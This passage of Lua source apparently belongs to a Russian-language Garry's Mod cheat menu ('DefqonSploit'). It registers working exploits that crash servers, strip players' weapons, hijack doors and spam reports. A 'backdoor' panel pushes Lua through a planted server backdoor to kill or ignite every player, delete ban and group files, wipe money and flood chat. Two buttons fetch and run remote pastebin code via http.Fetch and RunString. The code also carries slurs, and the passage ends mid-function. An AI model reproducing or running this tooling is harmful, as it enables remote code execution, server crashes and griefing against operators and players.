{ typ = "func", name = "Взять оружие #2", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Взять оружие #3", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Admin Stick | Door exploit", {
desc = "Открыть / Закрыть дверь / Удалить владельца (вы должны смотреть на дверь)",
severity = 3,
scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Открыть", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Закрыть", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Удалить владельца", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Defqon Report Spammer", {
desc = "Report спаммер",
severity = 1,
scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Зарепортить всех", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVER CODER BY Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "SAC Crash", {
desc = "Мгновенный краш сервера, использующего SAC анти-чит",
severity = 3,
scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
iZNX.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Server Crash", {
desc = "Нажмите эту кнопку, чтобы мгновенно крашнуть сервер, на 99.9% не работает",
severity = 3,
scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
iZNX.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
iZNX.AddExploit( "Strip the weapons", {
desc = "Strip оружия у любого игрока.",
severity = 3,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Тип оружия", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Стрип", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "stripclub" ) then
iZNX.ChatText( "Strip запущен" )
timer.Create( "stripclub", 0.5, 0, function()
local t = iZNX.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = iZNX.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
iZNX.ChatText( "Strip остановлен" )
end
end, },
},
} )
------------------------------------------------------------------------------------------------------------------------------------------------
function iZNX.MakeFunctionButtonr( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 0, 0, 255) ) -- Цвет текста на кнопках
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.MakeFunctionButtonb( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(9, 173, 181, 255) ) -- Цвет текста на кнопках
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Цвет текста на кнопках
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
-------------------------------------------------------------------------
function iZNX.SoundBoard( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.Sound()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.Sound()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(240,350)
iZNX.HTXCommandeSelector:SetTitle("Воспроизведение Звуков")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local sound1 = vgui.Create("DButton", DScrollPanel)
sound1:SetSize( 208, 20 )
sound1:SetPos( 2, 0 )
sound1:SetText("Порно звуки")
sound1:SetTextColor(Color(255, 255, 255, 255))
sound1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound1.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/33i6.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound2 = vgui.Create("DButton", DScrollPanel)
sound2:SetSize( 208, 20 )
sound2:SetPos( 2, 25 )
sound2:SetText("Чё пацаны, аниме? OVER9000 BASS")
sound2:SetTextColor(Color(255, 255, 255, 255))
sound2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/5maL.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound3 = vgui.Create("DButton", DScrollPanel)
sound3:SetSize( 208, 20 )
sound3:SetPos( 2, 50 )
sound3:SetText("Ор из Зеленого Слоника (-уши)")
sound3:SetTextColor(Color(255, 255, 255, 255))
sound3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound3.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/62xu.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound4 = vgui.Create("DButton", DScrollPanel)
sound4:SetSize( 208, 20 )
sound4:SetPos( 2, 75 )
sound4:SetText("Smash Mouth OVER9000 BASS (-уши)")
sound4:SetTextColor(Color(255, 255, 255, 255))
sound4.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound4.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/6377.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local sound5 = vgui.Create("DButton", DScrollPanel)
sound5:SetSize( 208, 20 )
sound5:SetPos( 2, 100 )
sound5:SetText("Gucci Gang But Im Screaming")
sound5:SetTextColor(Color(255, 255, 255, 255))
sound5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
sound5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/68o4.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
end
-------------------------------------------------------------------------------------
function iZNX.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXCommandeListe()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(240,350)
iZNX.HTXCommandeSelector:SetTitle("Дефкон макросы")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
commandnethtx1:SetSize( 208, 20 )
commandnethtx1:SetPos( 2, 175 )
commandnethtx1:SetText("Убить всех")
commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
commandnethtx1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx1.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все мертвы" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 208, 20 )
commandnethtx2:SetPos( 2, 100 )
commandnethtx2:SetText("Безобидное disco [не ломает ничего]")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/8UVtBXVn\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
commandnethtx3:SetSize( 208, 20 )
commandnethtx3:SetPos( 2, 375 )
commandnethtx3:SetText("Удалить ulx баны")
commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
commandnethtx3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx3.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
commandnethtx4:SetSize( 208, 20 )
commandnethtx4:SetPos( 2, 725 )
commandnethtx4:SetText("Поджечь всех")
commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
commandnethtx4.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx4.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Поджигаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
commandnethtx5:SetSize( 208, 20 )
commandnethtx5:SetPos( 2, 150 )
commandnethtx5:SetText("Удалить ulx группы")
commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
commandnethtx5.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx5.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
commandnethtx6:SetSize( 208, 20 )
commandnethtx6:SetPos( 2, 50 )
commandnethtx6:SetText("Выключить сервер")
commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
commandnethtx6.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx6.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Выключаем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString("timer.Create( \"spamlolk\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \" \") end end)")
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 208, 20 )
commandnethtx7:SetPos( 2, 200 )
commandnethtx7:SetText("Спам в чат")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
local chatrapemike = false
commandnethtx7.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
RainbowMike = {
"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
}
        chatrapemike = !chatrapemike
        if( chatrapemike ) then
                timer.Create( "niggaspams", 0.0001, 0, function()
                    net.Start(thefrenchenculer)
                    net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(RainbowMike).."]]) end " )
                    net.WriteBit (1)
                    net.SendToServer()
                end )
        else
                timer.Destroy( "niggaspams" )


        end
    end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 225 )
commandnethtx8:SetText("Изменить всем модели")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Изменяем" )
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
commandnethtx9:SetSize( 208, 20 )
commandnethtx9:SetPos( 2, 250 )
commandnethtx9:SetText("Сломать физику")
commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
commandnethtx9.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx9.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сломано" )
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
commandnethtx10:SetSize( 208, 20 )
commandnethtx10:SetPos( 2, 275 )
commandnethtx10:SetText("Обратная гравитация")
commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
commandnethtx10.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx10.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бах" )
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
commandnethtx11:SetSize( 208, 20 )
commandnethtx11:SetPos( 2, 300 )
commandnethtx11:SetText("Сбросить все деньги")
commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
commandnethtx11.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx11.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сброшено" )
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
commandnethtx12:SetSize( 208, 20 )
commandnethtx12:SetPos( 2, 325 )
commandnethtx12:SetText("Запустить всех в воздух")
commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
commandnethtx12.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx12.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ухуу" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 208, 20 )
commandnethtx13:SetPos( 2, 350 )
commandnethtx13:SetText("Изменить всем имена")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Изменено" )
net.Start(thefrenchenculer)
net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Hacked by DefqonSploit\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx14 = vgui.Create("DButton", DScrollPanel)
commandnethtx14:SetSize( 208, 20 )
commandnethtx14:SetPos( 2, 75 )
commandnethtx14:SetText("Сломать сервер [disco]")
commandnethtx14:SetTextColor(Color(255, 255, 255, 255))
commandnethtx14.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx14.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/W529HLVb\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
commandnethtx15:SetSize( 208, 20 )
commandnethtx15:SetPos( 2, 400 )
commandnethtx15:SetText("Сломать Экономику")
commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
commandnethtx15.Paint = function(panel, w, h)
